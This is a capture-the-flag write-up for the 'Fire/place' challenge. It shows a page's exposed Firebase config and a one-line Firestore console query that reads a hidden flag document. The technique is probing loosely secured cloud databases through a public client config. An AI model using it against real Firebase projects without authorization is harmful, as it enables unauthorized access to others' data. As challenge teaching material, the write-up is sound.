# Houseplant 2020: Fire/place

## TL;DR

The site source exposes credentials to Firebase. Use the included JavaScript SDK to query for the flag.


## Source Exploration

### Site Overview

The challenge supplies `fire-place.html`. When opened with a web browser we see a grid of colored pixels and a hex color picker. Clicking on the grid will color that pixel with your chosen color. The grid appears to be collaborative across all users, such that our colorings become visible to all users, and their to us. Pixels colors can be overwritten.

### Flag Scouting

Within `fire-place.html` we immediately see a promising target:

```html
<script>
    var firebaseConfig = {
        apiKey: "<omitted>",
        authDomain: "<omitted>.firebaseapp.com",
        projectId: "<omitted>",
        storageBucket: "<omitted>.appspot.com",
        messagingSenderId: "<omitted>",
        appId: "<omitted>",
        measurementId: "<omitted>"
    };
    firebase.initializeApp(firebaseConfig);
    firebase.analytics();
    const db = firebase.firestore()
</script>

<!-- snip -->

<script>
    db.collection("board").doc("data")
    .onSnapshot(function(doc) {
        drawCanvas(doc.data().dat);
        PIXELARRAY=doc.data().dat;
    });
</script>
```


A web search lands us on the docs for the firebase `firestore` [JavaScript SDK](https://firebase.google.com/docs/reference/js/firebase.firestore).

## Exploit


This part may take some guesswork. Open `fire-place.html` in your browser, open the web console, and query with:

```js
>> (await db.collection("board").doc("flag").get()).data()
{
    // snip
    "flag!!!!": "rtcp{...}"
}
```
